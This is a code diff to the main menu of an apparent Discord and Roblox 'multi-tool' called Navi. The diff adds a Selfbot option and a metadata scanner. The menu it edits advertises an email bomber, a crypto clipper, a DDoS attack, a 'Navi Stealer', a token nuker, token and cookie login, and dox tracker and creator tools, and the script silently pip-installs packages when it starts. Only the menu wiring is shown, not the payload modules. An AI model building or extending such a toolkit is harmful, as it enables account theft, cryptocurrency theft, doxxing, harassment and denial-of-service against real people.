@@ -1,8 +1,8 @@
 import sys, time, subprocess, json, os, threading
 
 def _init():
-    try: import pystyle, requests, selenium, dns.resolver, bs4, socks
-    except: subprocess.check_call([sys.executable, "-m", "pip", "install", "pystyle", "requests", "selenium", "dnspython", "beautifulsoup4", "pysocks", "-q"])
+    try: import pystyle, requests, selenium, dns.resolver, bs4, socks, websocket, piexif, exifread, mutagen
+    except: subprocess.check_call([sys.executable, "-m", "pip", "install", "pystyle", "requests", "selenium", "dnspython", "beautifulsoup4", "pysocks", "websocket-client", "piexif", "exifread", "mutagen", "-q"])
 
 
 _init()
@@ -15,6 +15,7 @@ from modules.sysinfo import get_sys_data
 from modules.osint import whois_lookup, dns_lookup
 from modules.malicious import mail_bomb
 from modules.obfuscator import obfuscator_init
+from modules.metadata import metadata_init
 
 def cfg_mgr():
     while 1:
@@ -90,7 +91,7 @@ def run_app():
         _cl = Theme.get_colors()
         print_banner()
         print(Colorate.Horizontal(_cl["head"], "    [ DISCORD ]              [ OSINT ]                [ MALICIOUS ]"))
-        _d = [("[1] Webhook Tools", "[10] Port Scanner", "[20] Email Bomber"),("[2] Token Tools", "[11] Whois Lookup", "[21] Crypto Clipper"),("[3] Nitro Generator", "[12] DNS Lookup", "[22] Vuln Scanner"),("[4] Server Info", "[14] Dox Tracker", "[23] DDoS Attack"),("[5] Bot Invite Gen", "[15] Dox Creator", "[24] Navi Stealer"), ("", "[16] Phone Lookup", ""), ("", "[17] Email Lookup", "")]
+        _d = [("[1] Webhook Tools", "[10] Port Scanner", "[20] Email Bomber"),("[2] Token Tools", "[11] Whois Lookup", "[21] Crypto Clipper"),("[3] Nitro Generator", "[12] DNS Lookup", "[22] Vuln Scanner"),("[4] Server Info", "[14] Dox Tracker", "[23] DDoS Attack"),("[5] Bot Invite Gen", "[15] Dox Creator", "[24] Navi Stealer"), ("[6] Selfbot", "[16] Phone Lookup", ""), ("", "[17] Email Lookup", "")]
 
 
         for _r1, _r2, _r3 in _d:
@@ -100,7 +101,7 @@ def run_app():
                 return Colorate.Horizontal(_cl["num"], s[:_p]) + Colorate.Horizontal(_cl["txt"], f"{s[_p:]:<{w-_p}}")
             print(f"    {_f(_r1, 25)}{_f(_r2, 25)}{_f(_r3, 20)}")
         print("\n" + Colorate.Horizontal(_cl["head"], "    [ GENERAL ]              [ ROBLOX ]               [ FAKER ]               [ SYSTEM ]"))
-        _g = [("[30] Base64 Codec", "[40] User Info", "[50] Faker Tools", "[60] Info"),("[31] System Info", "[41] Cookie Info", "[34] Web Cloner", "[61] Config"),("[32] IP Pinger", "[42] Cookie Login", "", "[99] Exit"),("[33] Obfuscator", "", "", ""),("[13] Pass Generator", "", "", "")]
+        _g = [("[30] Base64 Codec", "[40] User Info", "[50] Faker Tools", "[60] Info"),("[31] System Info", "[41] Cookie Info", "[34] Web Cloner", "[61] Config"),("[32] IP Pinger", "[42] Cookie Login", "", "[99] Exit"),("[33] Obfuscator", "", "", ""),("[13] Metadata Scan", "", "", "")]
         for _r1, _r2, _r3, _r4 in _g:
             print(f"    {_f(_r1, 25)}{_f(_r2, 25)}{_f(_r3, 24)}{_f(_r4, 20)}")
         _c = get_inpt()
@@ -117,7 +118,7 @@ def run_app():
             while 1:
                 print_banner()
                 print(Colorate.Horizontal(_cl["head"], "  [ TOKEN & ACCOUNT TOOLS ]\n"))
-                menu_opts({"1": "ID to Token", "2": "Token Info", "3": "Token Nuker", "4": "Token Login", "5": "Status Rotator", "6": "Token Onliner", "99": "Return"})
+                menu_opts({"1": "ID to Token", "2": "Token Info", "3": "Token Nuker", "4": "Token Login", "5": "Status Rotator", "6": "Token Onliner", "7": "Selfbot", "99": "Return"})
                 _cc = get_inpt("navi@discord/tokens:~#")
                 if _cc == "1":
                     _uid = get_inpt("UID:")
@@ -138,7 +139,13 @@ def run_app():
                 elif _cc == "6":
                     from modules.discord_tools import token_onliner
                     token_onliner()
+                elif _cc == "7":
+                    from modules.discord_tools import selfbot_menu
+                    selfbot_menu()
                 elif _cc == "99": break
+        elif _c == "6":
+            from modules.discord_tools import selfbot_menu
+            selfbot_menu()
         elif _c == "3": nitro_generator(int(get_inpt("Threads (1):") or 1))
         elif _c == "4":
             from modules.discord_tools import server_info_lookup
@@ -161,8 +168,7 @@ def run_app():
             for _k, _v in _r.items(): print(Colorate.Horizontal(_cl["num"], f"  {_k}: ") + Colorate.Horizontal(_cl["txt"], str(_v)))
             input("\n  Enter...")
         elif _c == "13":
-            print(Colorate.Horizontal(_cl["head"], f"  => {make_pw(int(get_inpt('len:') or 16))}"))
-            input("\n  Enter...")
+            metadata_init()
         elif _c == "14":
             from modules.dox import dox_tracker
             dox_tracker()
